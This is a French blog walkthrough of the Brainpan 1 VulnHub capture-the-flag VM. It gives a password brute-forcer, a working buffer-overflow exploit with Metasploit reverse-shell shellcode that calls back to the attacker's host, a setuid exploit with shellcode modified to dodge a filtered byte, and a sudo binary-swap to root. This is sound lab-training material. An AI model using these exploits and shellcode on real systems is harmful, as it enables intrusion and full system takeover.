# Solution du CTF Brainpan 1

Introduction
------------

Le challenge [Brainpan 2](http://devloop.users.sourceforge.net/index.php?article73/solution-du-ctf-brainpan2) était le 3ème CTF auquel je me suis attaqué sur *VulnHub*.  

Je ne m'étais pas encore penché sur [le premier du nom](http://vulnhub.com/entry/brainpan-1,51/), ne savant pas trop si le 2 signifiait un tout autre challenge où juste une mise à jour.  

L'expérience m'a montré que les CTF numérotés sont bien différents les un des autres bien que les deux *Brainpan* disposent de certaines caractéristiques communes.  

Déjà vu ?
---------

Le scan *Nmap* a révélé les même ports ouverts que sur *Brainpan 2* à savoir le 9999 pour un service custom et le 10000 pour un serveur web via *SimpleHTTPServer* (Python).  

Je me suis attaqué au port 999 qui ressemble fortement (là encore) à la seconde édition sauf qu'il faut ici saisir un mot de passe.  

J'ai écrit le script d'attaque force brute suivant qui a fini par trouver le mot de passe :  

```python
import socket

fd = open("rockyou.txt")

i = 0
while True:
    word = fd.readline()
    if not word:
        break

    word = word.strip()
    sock = socket.socket()
    sock.connect(('192.168.1.43', 9999))
    sock.recv(1024)
    sock.send(word + '\n')
    buff = sock.recv(1024)
    sock.close()
    if not "ACCESS DENIED" in buff:
        print "[!] Correct password is", word
        print "response:", buff
        break
    if i == 1000:
        print "[*] Testing", word
        i = 0
    i += 1
fd.close()
```

L'output du script est le suivant :  

```plain
[*] Testing storm98
[*] Testing srfrgrl
[*] Testing sophia09
[*] Testing smokie7
[*] Testing sisterbrother
[*] Testing shortbody
[!] Correct password is shitstorm
response:                           ACCESS GRANTED
```

Seulement quand on s'y connecte l'expérience est de courte durée :  

```plain
$ ncat 192.168.1.43 9999 -v
Ncat: Version 6.01 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.1.43:9999.
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> shitstorm
                          ACCESS GRANTEDNcat: 10 bytes sent, 704 bytes received in 3.10 seconds.
```

WTF ?  

And now for something completly different
-----------------------------------------

Heureusement j'avais lancé *dirb* en parallèle qui me trouve un dossier */bin* sur le serveur web (same old story).  

Et dedans un exécutable *brainpan.exe* : Oui ! Il s'agit bien d'un binaire Windows !  

```plain
PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
```

Notez qu'avec un simple coup de *"strings"* on retrouve illico le password *shitstorm*.  

Et un coup de *HT-Editor* supplémentaire confirme aussi que le programme ne fait rien de particulier sur la saisir du bon mot de passe.  

On remarque aussi rapidement depuis le désassembleur que le programme doit afficher des messages supplémentaires sur stderr.  

Après avoir vérifié que le programme ne fait rien de nasty je le lance via wine et je lui envoie un bon gros buffer de *A* via ncat. L'équivalent du *DrWatson* se réveille et nous donne les infos concernant le crash :  

![Wine watson](https://github.com/devl00p/blog/raw/master/images/brainpan_1/watson.png)

Bingo ! On peut écraser EIP. Il ne reste qu'à déterminer combien d'octets doivent être passés pour y parvenir.  

L'instruction Python suivante permet de générer une chaîne pour déterminer cela :  

```python
"A" * 516 + "B" * 4 + "C" * 4 + "D" * 4 + "E" * 4 + "F" * 4 + "G" * 4 + "H" * 4 + "I" * 4 + "J" * 4
```

Et cette fois EIP est rempli de D :  

```plain
Unhandled exception: page fault on read access to 0x44444444 in 32-bit code (0x44444444).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:0063 GS:006b
 EIP:44444444 ESP:0042f800 EBP:43434343 EFLAGS:00010297(  R- --  I S -A-P-C)
 EAX:ffffffff EBX:7b8bb000 ECX:00000073 EDX:0042f5f0
 ESI:7ffdf000 EDI:31171280
```

Il nous faut donc 516 + 8 = 524 octets avant d’écraser EIP. On relance en mettant 524 A puis 4 D. On en profite pour regarder plus en détails l'état de la stack et des registres via *winedbg* dont les commandes sont similaires à *gdb* :  

```plain
$ winedbg ./brainpan.exe 
fixme:service:scmdatabase_autostart_services Auto-start service L"PGPsdkDriver" failed to start: 2
fixme:service:scmdatabase_autostart_services Auto-start service L"PGPsdkServ" failed to start: 2
fixme:advapi:RegisterEventSourceA ((null),"PGPservice"): stub
fixme:advapi:RegisterEventSourceW (L"",L"PGPservice"): stub
fixme:advapi:ReportEventA (0xcafe4242,0x0004,0x0000,0x00000069,(nil),0x0000,0x00000000,0xe7e970,(nil)): stub
wine: Unhandled page fault on read access to 0x00000000 at address 0x10079c8a (thread 0023), starting debugger...
WineDbg starting on pid 002d
0x7b862457: movl        %edi,0x4(%esp)
Wine-dbg>c
Unhandled exception: page fault on read access to 0x42424242 in 32-bit code (0x42424242).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:0063 GS:006b
 EIP:42424242 ESP:0043f800 EBP:41414141 EFLAGS:00010297(  R- --  I S -A-P-C)
 EAX:ffffffff EBX:7b8bb000 ECX:00000073 EDX:0043f5f0
 ESI:7ffdf000 EDI:31171280
Stack dump:
0x0043f800:  0043000a 0043fa20 000003e8 00000000
0x0043f810:  0000027f 00000000 7ed60fc6 00000000
0x0043f820:  7ede10e0 00000000 00001f80 00000010
0x0043f830:  00000000 00000000 00000000 00000000
0x0043f840:  25d00002 0100007f 00000000 00000000
0x0043f850:  0f270002 00000000 00000000 00000000
000c: sel=0067 base=00000000 limit=00000000 32-bit --x
Backtrace:
=>0 0x42424242 (0x41414141)
0x42424242: -- no code accessible --
Wine-dbg>info reg
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:0063 GS:006b
 EIP:42424242 ESP:0043f800 EBP:41414141 EFLAGS:00010297(  R- --  I S -A-P-C)
 EAX:ffffffff EBX:7b8bb000 ECX:00000073 EDX:0043f5f0
 ESI:7ffdf000 EDI:31171280
Wine-dbg>x/s 0x0043fa20
AAAAAAAAAAAAAAAA---snip---AAAAAAAAAAAAAAAA
```

Cool ! Le second dword sur la stack est un pointeur vers le début du buffer.  

Si on veut faire un exploit stable il suffit de trouver dans le code une instruction pop-ret qui dépile le premier dword et saute vers le buffer.  

Avec *ROPgadget* (*./ROPgadget.py --binary ../brainpan.exe*) on obtient rapidement ce que l'on souhaite (*0x311712f8 : pop ebx ; ret*)  

On vérifie cela en plaçant des 0xCC (sigtrap) dans le buffer qui seront attrapées par le débugger si on saute effectivement dessus :  

```python
import struct
import socket

popret = 0x311712f8
buff = "\xcc" * 524 + struct.pack("I", popret)

sock = socket.socket()
sock.connect(('127.0.0.1', 9999))
sock.recv(1024)
sock.send(buff)
raw_input("Press enter to continue")
sock.close()
```

Et c'est le win !  

![brainpan win32 sigtrap](https://github.com/devl00p/blog/raw/master/images/brainpan_1/debug_payload.png)

Après avoir cherché un shellcode potable sur le web je m'en suis finalement remis à *Metasploit* car ça reste la crème de la crème (la cerise sur le gâteau) :  

```python
import struct
import socket

popret = 0x311712f8

# msfpayload windows/shell_reverse_tcp LHOST=192.168.1.3 LPORT=8888 R | msfencode -b '\x00' -t python
# [*] x86/shikata_ga_nai succeeded with size 341 (iteration=1)

shellcode =  ""
shellcode += "\xbf\xdc\x1d\x7c\x85\xda\xca\xd9\x74\x24\xf4\x58\x31"
shellcode += "\xc9\xb1\x4f\x31\x78\x14\x83\xe8\xfc\x03\x78\x10\x3e"
shellcode += "\xe8\x80\x6d\x37\x13\x79\x6e\x27\x9d\x9c\x5f\x75\xf9"
shellcode += "\xd5\xf2\x49\x89\xb8\xfe\x22\xdf\x28\x74\x46\xc8\x5f"
shellcode += "\x3d\xec\x2e\x51\xbe\xc1\xee\x3d\x7c\x40\x93\x3f\x51"
shellcode += "\xa2\xaa\x8f\xa4\xa3\xeb\xf2\x47\xf1\xa4\x79\xf5\xe5"
shellcode += "\xc1\x3c\xc6\x04\x06\x4b\x76\x7e\x23\x8c\x03\x34\x2a"
shellcode += "\xdd\xbc\x43\x64\xc5\xb7\x0b\x55\xf4\x14\x48\xa9\xbf"
shellcode += "\x11\xba\x59\x3e\xf0\xf3\xa2\x70\x3c\x5f\x9d\xbc\xb1"
shellcode += "\x9e\xd9\x7b\x2a\xd5\x11\x78\xd7\xed\xe1\x02\x03\x78"
shellcode += "\xf4\xa5\xc0\xda\xdc\x54\x04\xbc\x97\x5b\xe1\xcb\xf0"
shellcode += "\x7f\xf4\x18\x8b\x84\x7d\x9f\x5c\x0d\xc5\xbb\x78\x55"
shellcode += "\x9d\xa2\xd9\x33\x70\xdb\x3a\x9b\x2d\x79\x30\x0e\x39"
shellcode += "\xfb\x1b\x47\x8e\x31\xa4\x97\x98\x42\xd7\xa5\x07\xf8"
shellcode += "\x7f\x86\xc0\x26\x87\xe9\xfa\x9e\x17\x14\x05\xde\x3e"
shellcode += "\xd3\x51\x8e\x28\xf2\xd9\x45\xa9\xfb\x0f\xc9\xf9\x53"
shellcode += "\xe0\xa9\xa9\x13\x50\x41\xa0\x9b\x8f\x71\xcb\x71\xa6"
shellcode += "\xb6\x5c\xba\x11\x39\x9e\x52\x60\x39\x82\x1a\xed\xdf"
shellcode += "\xa8\x4a\xb8\x48\x45\xf2\xe1\x02\xf4\xfb\x3f\x82\x95"
shellcode += "\x6e\xa4\x52\xd3\x92\x73\x05\xb4\x65\x8a\xc3\x28\xdf"
shellcode += "\x24\xf1\xb0\xb9\x0f\xb1\x6e\x7a\x91\x38\xe2\xc6\xb5"
shellcode += "\x2a\x3a\xc6\xf1\x1e\x92\x91\xaf\xc8\x54\x48\x1e\xa2"
shellcode += "\x0e\x27\xc8\x22\xd6\x0b\xcb\x34\xd7\x41\xbd\xd8\x66"                                                                                                                                            
shellcode += "\x3c\xf8\xe7\x47\xa8\x0c\x90\xb5\x48\xf2\x4b\x7e\x78"                                                                                                                                            
shellcode += "\xb9\xd1\xd7\x11\x64\x80\x65\x7c\x97\x7f\xa9\x79\x14"                                                                                                                                            
shellcode += "\x75\x52\x7e\x04\xfc\x57\x3a\x82\xed\x25\x53\x67\x11"                                                                                                                                            
shellcode += "\x99\x54\xa2"                                                                                                                                                                                    

buff = "\x90" * (524 - len(shellcode)) + shellcode + struct.pack("I", popret)                                                                                                                                  

sock = socket.socket()                                                                                                                                                                                         
sock.connect(('192.168.1.43', 9999))                                                                                                                                                                           
print "[*] Connected, sending payload (connect-back 8888)"                                                                                                                                                     
sock.recv(1024)                                                                                                                                                                                                
sock.send(buff)                                                                                                                                                                                                
raw_input("Enjoy your shell, press enter to exit")                                                                                                                                                             
sock.close()
```

![Connect back](https://github.com/devl00p/blog/raw/master/images/brainpan_1/connect_back.png)

A ma grande surprise on peut faire exécuter des commandes linux depuis l'invite de commande récupérée (j'ai testé préalablement sur ma machine et ça ne fonctionnait pas).  

![Linux command from wine](https://github.com/devl00p/blog/raw/master/images/brainpan_1/linux_wine.png)  

Comme sur le *Brainpan1*, j'uploade un *tshd* car aucun serveur SSH ne tourne sur le système.  

Je retrouve le script chargé de redémarrer les services :  

```bash
#!/bin/bash
# run brainpan.exe if it stops
lsof -i:9999
if [[ $? -eq 1 ]]; then 
        pid=`ps aux | grep brainpan.exe | grep -v grep`
        if [[ ! -z $pid ]]; then
                kill -9 $pid
                killall wineserver
                killall winedevice.exe
        fi
        /usr/bin/wine /home/puck/web/bin/brainpan.exe &
fi 

# run SimpleHTTPServer if it stops
lsof -i:10000
if [[ $? -eq 1 ]]; then 
        pid=`ps aux | grep SimpleHTTPServer | grep -v grep`
        if [[ ! -z $pid ]]; then
                kill -9 $pid
        fi
        cd /home/puck/web
        /usr/bin/python -m SimpleHTTPServer 10000
fi
```

Who do you want to be today? (aka hk.exe ;-)
--------------------------------------------

Les utilisateurs donnent un air de déjà vu :  

```plain
reynard:x:1000:1000:Reynard,,,:/home/reynard:/bin/bash
anansi:x:1001:1001:Anansi,,,:/home/anansi:/bin/bash
puck:x:1002:1002:Puck,,,:/home/puck:/bin/bash
```

L'utilisateur *Puck* sur lequel on a la main a le droits d'exécuter une commande en tant que root... mais on ne dispose d'aucun accès au binaire :'(  

```plain
puck@brainpan:~$ sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
```

On se rencarde donc sur *anansi* qui est notre nouveau meilleur ennemi :  

```python
puck@brainpan:~$ find / -user anansi 2> /dev/null
/usr/local/bin/validate
/home/anansi
```

Le binaire *validate* est setuid de cet utilisateur. A l'attaque !  

```plain
puck@brainpan:~$ /usr/local/bin/validate
usage /usr/local/bin/validate <input>
puck@brainpan:~$ /usr/local/bin/validate test
validating input...passed.
```

Il s'agit d'un binaire Linux classique :  

```plain
validate: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
dynamically linked (uses shared libs), for GNU/Linux 2.6.15,
BuildID[sha1]=c4b7d3019dda6ebc259c4e4b63a336e00a63b949, not stripped
```

*nm* fait état d'une fonction *validate* ainsi que de l'utilisation de fonctions connues :  

```plain
08048538 T main
         U printf@@GLIBC_2.0                                                                                                                                                                                   
         U puts@@GLIBC_2.0                                                                                                                                                                                     
08048400 T _start                                                                                                                                                                                              
         U strcpy@@GLIBC_2.0                                                                                                                                                                                   
         U strlen@@GLIBC_2.0                                                                                                                                                                                   
080484b4 T validate
```

Le main est très simple :  

```plain
   0x0804856c <+52>:    call   0x80483cc <printf@plt>
   0x08048571 <+57>:    mov    0xc(%ebp),%eax
   0x08048574 <+60>:    add    $0x4,%eax
   0x08048577 <+63>:    mov    (%eax),%eax
   0x08048579 <+65>:    mov    %eax,(%esp)
   0x0804857c <+68>:    call   0x80484b4 <validate>
   0x08048581 <+73>:    mov    %eax,0x1c(%esp)
   0x08048585 <+77>:    cmpl   $0x0,0x1c(%esp)
   0x0804858a <+82>:    je     0x8048598 <main+96>
   0x0804858c <+84>:    movl   $0x8048692,(%esp)     <- "passed."
   0x08048593 <+91>:    call   0x80483dc <puts@plt>
   0x08048598 <+96>:    mov    $0x0,%eax
   0x0804859d <+101>:   leave  
   0x0804859e <+102>:   ret
```

Quand à la fonction validate :  

```plain
Dump of assembler code for function validate:
   0x080484b4 <+0>:     push   %ebp
   0x080484b5 <+1>:     mov    %esp,%ebp
   0x080484b7 <+3>:     push   %ebx
   0x080484b8 <+4>:     sub    $0x84,%esp              <-- 132 octets
   0x080484be <+10>:    movl   $0x0,-0xc(%ebp)
   0x080484c5 <+17>:    movl   $0x0,-0xc(%ebp)         <-- init compteur
   0x080484cc <+24>:    jmp    0x8048508 <validate+84> <-- saut direct
   0x080484ce <+26>:    mov    -0xc(%ebp),%eax         <-- met le compteur dans eax
   0x080484d1 <+29>:    add    0x8(%ebp),%eax          <-- ajoute l'adresse de la chaine
   0x080484d4 <+32>:    movzbl (%eax),%eax
   0x080484d7 <+35>:    cmp    $0x46,%al               <-- compare avec F
   0x080484d9 <+37>:    jne    0x8048504 <validate+80>
   0x080484db <+39>:    mov    -0xc(%ebp),%eax
   0x080484de <+42>:    add    0x8(%ebp),%eax
   0x080484e1 <+45>:    movzbl (%eax),%eax
   0x080484e4 <+48>:    movsbl %al,%edx
   0x080484e7 <+51>:    mov    $0x8048660,%eax
   0x080484ec <+56>:    mov    %edx,0x4(%esp)
   0x080484f0 <+60>:    mov    %eax,(%esp)
   0x080484f3 <+63>:    call   0x80483cc <printf@plt>
   0x080484f8 <+68>:    movl   $0x1,(%esp)
   0x080484ff <+75>:    call   0x80483ec <exit@plt>
   0x08048504 <+80>:    addl   $0x1,-0xc(%ebp)         <-- increment
   0x08048508 <+84>:    mov    -0xc(%ebp),%ebx
   0x0804850b <+87>:    mov    0x8(%ebp),%eax
   0x0804850e <+90>:    mov    %eax,(%esp)
   0x08048511 <+93>:    call   0x80483ac <strlen@plt>  <-- teste si la longueur est 0
   0x08048516 <+98>:    cmp    %eax,%ebx
   0x08048518 <+100>:   jb     0x80484ce <validate+26> <-- si pas 0 remonte
   0x0804851a <+102>:   mov    0x8(%ebp),%eax
   0x0804851d <+105>:   mov    %eax,0x4(%esp)
   0x08048521 <+109>:   lea    -0x70(%ebp),%eax
   0x08048524 <+112>:   mov    %eax,(%esp)
   0x08048527 <+115>:   call   0x80483bc <strcpy@plt>  <-- copie la chaine dans ebp-112
   0x0804852c <+120>:   lea    -0x70(%ebp),%eax
   0x0804852f <+123>:   add    $0x84,%esp
   0x08048535 <+129>:   pop    %ebx
   0x08048536 <+130>:   pop    %ebp
   0x08048537 <+131>:   ret
```

Que fait le programme ? Il parcoure les caractères de la chaîne passée en paramètre.  

S'il rencontre un caractère F alors le programme quittera en disant que la validation a échouée.  

En revanche si aucun *F* n'est trouvé alors le programme passe la validation et recopie la chaîne dans un buffer.  

Si on passe la chaine *"A" \* 112 + "B" \*4 + "C" \* 4* (toujours du Python) on retrouve *CCCC* dans eip et *BBB* dans ebp.  

Cette fois c'est le registre eax qui pointe vers notre chaîne :  

```plain
(gdb) x/s $eax
0xffffcf48:     'A' <repeats 112 times>, "BBBBCCCC"
```

Il nous faut donc une adresse de retour de type *jmp eax* ou *call eax* ce qui s'obtient facilement avec *objdump* (*objdump -D validate | grep call*).  

En l'occurence il y a deux *call eax*, l'un en *080484af*, l'autre en *0804862b*.  

La randomisation étant activée c'est bien la solution à prendre.  

Maintenant, le point important c'est que le shellcode ne doit pas contenir de caractère F (0x46).  

0x46 correspond à l'instruction assembleur *inc esi* et à un niveau plus général 0x46 est utilisé comme base pour presque toutes les opérations concernant esi (pour résumer 0x46 = esi).  

Il nous faut donc un shellcode qui n'utilise pas ce registre.  

Mais l'auteur du challenge n'a pas choisi la valeur 0x46 au hasard : c'est aussi le code attribué à *sys\_setreuid* pour les syscalls...  

J'ai choisi [un shellcode qui effectue un setreuid de getuid](http://www.shell-storm.org/shellcode/files/shellcode-399.php) (ça fonctionne pour tous les binaires setuid root ou pas).  

Il faut seulement le changer un peu pour qu'à la place de faire le *push 0x46-pop eax* il fasse un *push 0x45-pop eax-inc eax*.  

L'opcode pour *inc eax* est 0x40.  

J'obtiens alors le shellcode et le code d'exploitation suivant :  

```python
import subprocess
import struct

ret = struct.pack("I", 0x0804862b)
shellcode = "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x45\x58\x40\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"
buffer = shellcode + "A" * (116 - len(shellcode)) + ret

subprocess.call(["/usr/local/bin/validate", buffer])
```

Notez qu'au début j'avais mis un nopsled au début puis le shellcode mais le programme tronquait la chaîne en plaçant un octet null aux deux tiers du shellcode provoquant une erreur. Peut-être l'effet d'un compteur écrasé... En plaçant le shellcode au tout début, pas de problèmes :)  

Root 66
-------

L'accès anansi obtenu, voyons voir ce que fait l'utilitaire mentionné plus tôt :  

```plain
anansi@brainpan:/home/anansi$ ./bin/anansi_util
Usage: ./bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
```

On trouve les chaines de caractères suivantes dans le binaire :  

```plain
/sbin/ip
/usr/bin/man
/usr/bin/top
```

Rien de plus à voir, d'ailleurs peut importe, il nous suffit de le remplacer par bash pour profiter des droits sudo de *Puck*.  

Le problème venait des droits sur */home/anansi* qui ne nous laissaient pas traverser jusqu'au binaire :  

```plain
anansi@brainpan:/home/anansi$ ls -ld .
drwx------ 4 anansi anansi 4096 Mar  4  2013 .
anansi@brainpan:/home/anansi$ chmod o+rx .
anansi@brainpan:/home/anansi$ ls -ld .
drwx---r-x 4 anansi anansi 4096 Mar  4  2013 .
anansi@brainpan:/home/anansi$ cd bin/
anansi@brainpan:/home/anansi/bin$ ls
anansi_util
anansi@brainpan:/home/anansi/bin$ mv anansi_util sav_anansi_util
anansi@brainpan:/home/anansi/bin$ cp /bin/bash anansi_util
anansi@brainpan:/home/anansi/bin$ exit
$ id
uid=1001(anansi) gid=1002(puck) groups=1001(anansi),1002(puck)
$ 
puck@brainpan:~$ sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
puck@brainpan:~$ sudo /home/anansi/bin/anansi_util
root@brainpan:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Pas de flag mais un fichier avec un ascii art dans */root/b.txt*.  

Un challenge agréable comme c'était le cas pour la première édition :)

*Published August 26 2014 at 08 13*